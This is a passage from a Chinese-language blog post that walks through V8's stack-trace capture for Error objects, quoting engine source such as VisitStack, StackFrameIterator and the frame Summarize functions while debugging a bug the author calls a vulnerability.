</span></span><span style="display:flex;"><span>    error_stack <span style="color:#f92672">=</span> CaptureSimpleStackTrace(<span style="color:#66d9ef">this</span>, limit, mode, caller);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Next is the inspector part: Depending on whether we got a &#34;simple
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// stack trace&#34; above and whether that&#39;s usable (meaning the API
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// didn&#39;t request to include cross-origin frames), we remember the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// cap for the stack trace (either a positive limit indicating that
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// the Error.stackTraceLimit value was below what was requested via
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// the API, or a negative limit to indicate the opposite), or we
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// collect a &#34;detailed stack trace&#34; eagerly and stash that away.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (capture_stack_trace_for_uncaught_exceptions_) {
</span></span><span style="display:flex;"><span>    Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> limit_or_stack_frame_infos;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (error_stack<span style="color:#f92672">-&gt;</span>IsUndefined(<span style="color:#66d9ef">this</span>) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        (stack_trace_for_uncaught_exceptions_options_ <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>         StackTrace<span style="color:#f92672">::</span>kExposeFramesAcrossSecurityOrigins)) {
</span></span><span style="display:flex;"><span>      limit_or_stack_frame_infos <span style="color:#f92672">=</span> CaptureDetailedStackTrace(
</span></span><span style="display:flex;"><span>          stack_trace_for_uncaught_exceptions_frame_limit_,
</span></span><span style="display:flex;"><span>          stack_trace_for_uncaught_exceptions_options_);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> limit <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          stack_trace_limit <span style="color:#f92672">&gt;</span> stack_trace_for_uncaught_exceptions_frame_limit_
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">?</span> <span style="color:#f92672">-</span>stack_trace_for_uncaught_exceptions_frame_limit_
</span></span><span style="display:flex;"><span>              : stack_trace_limit;
</span></span><span style="display:flex;"><span>      limit_or_stack_frame_infos <span style="color:#f92672">=</span> handle(Smi<span style="color:#f92672">::</span>FromInt(limit), <span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    error_stack <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        factory()<span style="color:#f92672">-&gt;</span>NewErrorStackData(error_stack, limit_or_stack_frame_infos);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  RETURN_ON_EXCEPTION(
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>,
</span></span><span style="display:flex;"><span>      JSObject<span style="color:#f92672">::</span>SetProperty(<span style="color:#66d9ef">this</span>, error_object, factory()<span style="color:#f92672">-&gt;</span>error_stack_symbol(),
</span></span><span style="display:flex;"><span>                            error_stack, StoreOrigin<span style="color:#f92672">::</span>kMaybeKeyed,
</span></span><span style="display:flex;"><span>                            Just(ShouldThrow<span style="color:#f92672">::</span>kThrowOnError)),
</span></span><span style="display:flex;"><span>      JSObject);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> error_object;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>经过几个小时的验证，我确认是在 Error 对象创建过程时抓取到的栈回溯已经出问题了，为了完全搞懂问题出在哪，我接下来分析一下栈回溯的过程。</p>
<p>栈回溯的主要流程在 <code>VisitStack</code> 函数中，由 StackFrameIterator 对象完成的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">typename</span> Visitor<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> VisitStack(Isolate<span style="color:#f92672">*</span> isolate, Visitor<span style="color:#f92672">*</span> visitor,
</span></span><span style="display:flex;"><span>                StackTrace<span style="color:#f92672">::</span>StackTraceOptions options <span style="color:#f92672">=</span> StackTrace<span style="color:#f92672">::</span>kDetailed) {
</span></span><span style="display:flex;"><span>  DisallowJavascriptExecution <span style="color:#a6e22e">no_js</span>(isolate);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (StackFrameIterator it(isolate); <span style="color:#f92672">!</span>it.done(); it.Advance()) {
</span></span><span style="display:flex;"><span>    StackFrame<span style="color:#f92672">*</span> frame <span style="color:#f92672">=</span> it.frame();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (frame<span style="color:#f92672">-&gt;</span>type()) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> StackFrame<span style="color:#f92672">::</span>BUILTIN_EXIT:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> StackFrame<span style="color:#f92672">::</span>JAVA_SCRIPT_BUILTIN_CONTINUATION:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> StackFrame<span style="color:#f92672">::</span>JAVA_SCRIPT_BUILTIN_CONTINUATION_WITH_CATCH:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> StackFrame<span style="color:#f92672">::</span>OPTIMIZED:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> StackFrame<span style="color:#f92672">::</span>INTERPRETED:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> StackFrame<span style="color:#f92672">::</span>BASELINE:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">case</span> StackFrame<span style="color:#f92672">::</span>BUILTIN:
</span></span><span style="display:flex;"><span><span style="color:#75715e">#if V8_ENABLE_WEBASSEMBLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">case</span> StackFrame<span style="color:#f92672">::</span>WASM:
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif  </span><span style="color:#75715e">// V8_ENABLE_WEBASSEMBLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// A standard frame may include many summarized frames (due to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// inlining).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>FrameSummary<span style="color:#f92672">&gt;</span> summaries;
</span></span><span style="display:flex;"><span>        CommonFrame<span style="color:#f92672">::</span>cast(frame)<span style="color:#f92672">-&gt;</span>Summarize(<span style="color:#f92672">&amp;</span>summaries);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">auto</span> rit <span style="color:#f92672">=</span> summaries.rbegin(); rit <span style="color:#f92672">!=</span> summaries.rend(); <span style="color:#f92672">++</span>rit) {
</span></span><span style="display:flex;"><span>          FrameSummary<span style="color:#f92672">&amp;</span> summary <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>rit;
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">// Skip frames from other origins when asked to do so.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(options <span style="color:#f92672">&amp;</span> StackTrace<span style="color:#f92672">::</span>kExposeFramesAcrossSecurityOrigins) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">!</span>summary.native_context()<span style="color:#f92672">-&gt;</span>HasSameSecurityTokenAs(
</span></span><span style="display:flex;"><span>                  isolate<span style="color:#f92672">-&gt;</span>context())) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>visitor<span style="color:#f92672">-&gt;</span>Visit(summary)) <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>StackFrameIterator<span style="color:#f92672">::</span>StackFrameIterator(Isolate<span style="color:#f92672">*</span> isolate)
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">:</span> StackFrameIterator(isolate, isolate<span style="color:#f92672">-&gt;</span>thread_local_top()) {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>StackFrameIterator<span style="color:#f92672">::</span>StackFrameIterator(Isolate<span style="color:#f92672">*</span> isolate, ThreadLocalTop<span style="color:#f92672">*</span> t)
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">:</span> StackFrameIteratorBase(isolate, true) {
</span></span><span style="display:flex;"><span>  Reset(t);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> StackFrameIterator<span style="color:#f92672">::</span>Reset(ThreadLocalTop<span style="color:#f92672">*</span> top) {
</span></span><span style="display:flex;"><span>  StackFrame<span style="color:#f92672">::</span>State state;
</span></span><span style="display:flex;"><span>  StackFrame<span style="color:#f92672">::</span>Type type <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      ExitFrame<span style="color:#f92672">::</span>GetStateForFramePointer(Isolate<span style="color:#f92672">::</span>c_entry_fp(top), <span style="color:#f92672">&amp;</span>state);
</span></span><span style="display:flex;"><span>  handler_ <span style="color:#f92672">=</span> StackHandler<span style="color:#f92672">::</span>FromAddress(Isolate<span style="color:#f92672">::</span>handler(top));
</span></span><span style="display:flex;"><span>  frame_ <span style="color:#f92672">=</span> SingletonFor(type, <span style="color:#f92672">&amp;</span>state);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> Address <span style="color:#a6e22e">c_entry_fp</span>(ThreadLocalTop<span style="color:#f92672">*</span> <span style="color:#66d9ef">thread</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>c_entry_fp_;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>可以看到是从 thread-&gt;c_entry_fp_ 开始的，通过下数据访问断点，我发现这个变量是在 `Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit 中设置的，阅读代码发现这个函数负责在 javascript 调用 CPP 的 Runtime 函数时，在栈上构建 BuiltinExitFrame 调用栈，构建好的 BultinExitFrame 会被存储到 thread-&gt;c_entry_fp_ 中，目前存储的就是调用 ErrorConstruct 构建的 BuiltinExitFrame。</p>
<hr>
<p>⚡查资料来看 v8 的调用栈分很多种类型，适合不同的场景，比如从 CPP 到 Javascript 代码会构建一个 EntryFrame，解释器会构建一个 InterpretedFrame， Javascript 调用 CPP 函数会构建 ExitFrame/BuiltinExitFrame</p>
<hr>
<p>那么栈回溯就是从 ErrorConstruct 的栈帧开始，之后通过 <code>StackFrameIterator::Advance</code> 函数移动到调用方。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> StackFrameIterator<span style="color:#f92672">::</span>Advance() {
</span></span><span style="display:flex;"><span>  DCHECK(<span style="color:#f92672">!</span>done());
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Compute the state of the calling frame before restoring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// callee-saved registers and unwinding handlers. This allows the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// frame code that computes the caller state to access the top
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// handler and the value of any callee-saved register if needed.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  StackFrame<span style="color:#f92672">::</span>State state;
</span></span><span style="display:flex;"><span>  StackFrame<span style="color:#f92672">::</span>Type type <span style="color:#f92672">=</span> frame_<span style="color:#f92672">-&gt;</span>GetCallerState(<span style="color:#f92672">&amp;</span>state);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Unwind handlers corresponding to the current frame.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  StackHandlerIterator <span style="color:#a6e22e">it</span>(frame_, handler_);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>it.done()) it.Advance();
</span></span><span style="display:flex;"><span>  handler_ <span style="color:#f92672">=</span> it.handler();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Advance to the calling frame.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  frame_ <span style="color:#f92672">=</span> SingletonFor(type, <span style="color:#f92672">&amp;</span>state);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// When we&#39;re done iterating over the stack frames, the handler
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// chain must have been completely unwound. Except for wasm stack-switching:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// we stop at the end of the current segment.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#if V8_ENABLE_WEBASSEMBLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DCHECK_IMPLIES(done() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>FLAG_experimental_wasm_stack_switching,
</span></span><span style="display:flex;"><span>                 handler_ <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#else
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DCHECK_IMPLIES(done(), handler_ <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>移动操作主要是 <code>frame_-&gt;GetCallerState(&amp;state)</code> 语句完成，<code>GetCallerState</code> 是一个虚函数，不同类型的调用栈实现不同，调试时实际调用的是 <code>StackFrame::GetCallerState</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>StackFrame<span style="color:#f92672">::</span>Type StackFrame<span style="color:#f92672">::</span>GetCallerState(State<span style="color:#f92672">*</span> state) <span style="color:#66d9ef">const</span> {
</span></span><span style="display:flex;"><span>  ComputeCallerState(state); <span style="color:#75715e">// 也是虚函数，实际调用的是 ExitFrame::ComputeCallerState
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ComputeType</span>(iterator_, state);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> ExitFrame<span style="color:#f92672">::</span>ComputeCallerState(State<span style="color:#f92672">*</span> state) <span style="color:#66d9ef">const</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Set up the caller state.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  state<span style="color:#f92672">-&gt;</span>sp <span style="color:#f92672">=</span> caller_sp();
</span></span><span style="display:flex;"><span>  state<span style="color:#f92672">-&gt;</span>fp <span style="color:#f92672">=</span> Memory<span style="color:#f92672">&lt;</span>Address<span style="color:#f92672">&gt;</span>(fp() <span style="color:#f92672">+</span> ExitFrameConstants<span style="color:#f92672">::</span>kCallerFPOffset);
</span></span><span style="display:flex;"><span>  state<span style="color:#f92672">-&gt;</span>pc_address <span style="color:#f92672">=</span> ResolveReturnAddressLocation(
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span>Address<span style="color:#f92672">*&gt;</span>(fp() <span style="color:#f92672">+</span> ExitFrameConstants<span style="color:#f92672">::</span>kCallerPCOffset));
</span></span><span style="display:flex;"><span>  state<span style="color:#f92672">-&gt;</span>callee_pc_address <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (FLAG_enable_embedded_constant_pool) {
</span></span><span style="display:flex;"><span>    state<span style="color:#f92672">-&gt;</span>constant_pool_address <span style="color:#f92672">=</span> <span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span>Address<span style="color:#f92672">*&gt;</span>(
</span></span><span style="display:flex;"><span>        fp() <span style="color:#f92672">+</span> ExitFrameConstants<span style="color:#f92672">::</span>kConstantPoolOffset);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Address CommonFrame<span style="color:#f92672">::</span>GetCallerStackPointer() <span style="color:#66d9ef">const</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fp</span>() <span style="color:#f92672">+</span> CommonFrameConstants<span style="color:#f92672">::</span>kCallerSPOffset;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">T</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">inline</span> T<span style="color:#f92672">&amp;</span> Memory(Address addr) {
</span></span><span style="display:flex;"><span>  DCHECK(IsAligned(addr, <span style="color:#66d9ef">alignof</span>(T)));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">reinterpret_cast</span><span style="color:#f92672">&lt;</span>T<span style="color:#f92672">*&gt;</span>(addr);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">constexpr</span> <span style="color:#66d9ef">int</span> kCallerFPOffset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">*</span> kSystemPointerSize;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">constexpr</span> <span style="color:#66d9ef">int</span> kCallerPCOffset <span style="color:#f92672">=</span> kCallerFPOffset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> kFPOnStackSize;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">constexpr</span> <span style="color:#66d9ef">int</span> kCallerSPOffset <span style="color:#f92672">=</span> kCallerPCOffset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> kPCOnStackSize;
</span></span></code></pre></div><p>可以看到，Advance 操作，就是从栈中读取函数 Prolog 部分保存的上层函数的 ebp，通过 ebp 就可以读取到了上层函数的整个栈帧，跟 CPP 的栈回溯是差不多的。</p>
<p>再回到上面的 <code>VisitStack</code> 函数分析一下整个的栈回溯过程，可以看到对每层调用栈，调用 <code>CommonFrame::cast(frame)-&gt;Summarize(&amp;summaries);</code> 收集的此层函数调用的信息。<code>CommonFrame::Summarize</code> 是个虚函数，对于 Interpreter 栈帧来说实际调用的是 <code>UnoptimizedFrame::Summarize</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> UnoptimizedFrame<span style="color:#f92672">::</span>Summarize(std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>FrameSummary<span style="color:#f92672">&gt;*</span> functions) <span style="color:#66d9ef">const</span> {
</span></span><span style="display:flex;"><span>  DCHECK(functions<span style="color:#f92672">-&gt;</span>empty());
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>AbstractCode<span style="color:#f92672">&gt;</span> abstract_code(AbstractCode<span style="color:#f92672">::</span>cast(GetBytecodeArray()),
</span></span><span style="display:flex;"><span>                                     isolate());
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;</span> params <span style="color:#f92672">=</span> GetParameters();
</span></span><span style="display:flex;"><span>  FrameSummary<span style="color:#f92672">::</span>JavaScriptFrameSummary summary(
</span></span><span style="display:flex;"><span>      isolate(), receiver(), function(), <span style="color:#f92672">*</span>abstract_code, GetBytecodeOffset(),
</span></span><span style="display:flex;"><span>      IsConstructor(), <span style="color:#f92672">*</span>params);
</span></span><span style="display:flex;"><span>  functions<span style="color:#f92672">-&gt;</span>push_back(summary);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Object CommonFrameWithJSLinkage<span style="color:#f92672">::</span>receiver() <span style="color:#66d9ef">const</span> { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">GetParameter</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>JSFunction JavaScriptFrame<span style="color:#f92672">::</span>function() <span style="color:#66d9ef">const</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> JSFunction<span style="color:#f92672">::</span>cast(function_slot_object());
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;</span> CommonFrameWithJSLinkage<span style="color:#f92672">::</span>GetParameters() <span style="color:#66d9ef">const</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (V8_LIKELY(<span style="color:#f92672">!</span>FLAG_detailed_error_stack_trace)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">isolate</span>()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>empty_fixed_array();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> param_count <span style="color:#f92672">=</span> ComputeParametersCount();
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;</span> parameters <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      isolate()<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewFixedArray(param_count);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> param_count; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    parameters<span style="color:#f92672">-&gt;</span>set(i, GetParameter(i));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> parameters;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这个函数还相对简单，就是读取了当前栈帧中存储的 receiver, parameters, 字节码偏移量等信息, 存储到 summary。</p>
<p>触发漏洞的栈帧，是 turbofan 编译的代码创建的，对应的 <code>Summarize</code> 实现是 <code>OptimizedFrame::Summarize</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> OptimizedFrame<span style="color:#f92672">::</span>Summarize(std<span style="color:#f92672">::</span>vector<span style="color:#f92672">&lt;</span>FrameSummary<span style="color:#f92672">&gt;*</span> frames) <span style="color:#66d9ef">const</span> {
</span></span><span style="display:flex;"><span>  DCHECK(frames<span style="color:#f92672">-&gt;</span>empty());
</span></span><span style="display:flex;"><span>  DCHECK(is_optimized());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Delegate to JS frame in absence of turbofan deoptimization.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// TODO(turbofan): Revisit once we support deoptimization across the board.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  Code code <span style="color:#f92672">=</span> LookupCode();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (code.kind() <span style="color:#f92672">==</span> CodeKind<span style="color:#f92672">::</span>BUILTIN) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> JavaScriptFrame<span style="color:#f92672">::</span>Summarize(frames);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> deopt_index <span style="color:#f92672">=</span> SafepointEntry<span style="color:#f92672">::</span>kNoDeoptIndex;
</span></span><span style="display:flex;"><span>  DeoptimizationData <span style="color:#66d9ef">const</span> data <span style="color:#f92672">=</span> GetDeoptimizationData(<span style="color:#f92672">&amp;</span>deopt_index);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (deopt_index <span style="color:#f92672">==</span> SafepointEntry<span style="color:#f92672">::</span>kNoDeoptIndex) {
</span></span><span style="display:flex;"><span>    CHECK(data.is_null());
</span></span><span style="display:flex;"><span>    FATAL(<span style="color:#e6db74">&#34;Missing deoptimization information for OptimizedFrame::Summarize.&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Prepare iteration over translation. Note that the below iteration might
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// materialize objects without storing them back to the Isolate, this will
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// lead to objects being re-materialized again for each summary.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  TranslatedState <span style="color:#a6e22e">translated</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>  translated.Prepare(fp());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// We create the summary in reverse order because the frames
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// in the deoptimization translation are ordered bottom-to-top.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">bool</span> is_constructor <span style="color:#f92672">=</span> IsConstructor();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">auto</span> it <span style="color:#f92672">=</span> translated.begin(); it <span style="color:#f92672">!=</span> translated.end(); it<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span> TranslatedFrame<span style="color:#f92672">::</span>kUnoptimizedFunction <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span> TranslatedFrame<span style="color:#f92672">::</span>kJavaScriptBuiltinContinuation <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        it<span style="color:#f92672">-&gt;</span>kind() <span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>            TranslatedFrame<span style="color:#f92672">::</span>kJavaScriptBuiltinContinuationWithCatch) {
</span></span><span style="display:flex;"><span>      Handle<span style="color:#f92672">&lt;</span>SharedFunctionInfo<span style="color:#f92672">&gt;</span> shared_info <span style="color:#f92672">=</span> it<span style="color:#f92672">-&gt;</span>shared_info();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// The translation commands are ordered and the function is always
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// at the first position, and the receiver is next.
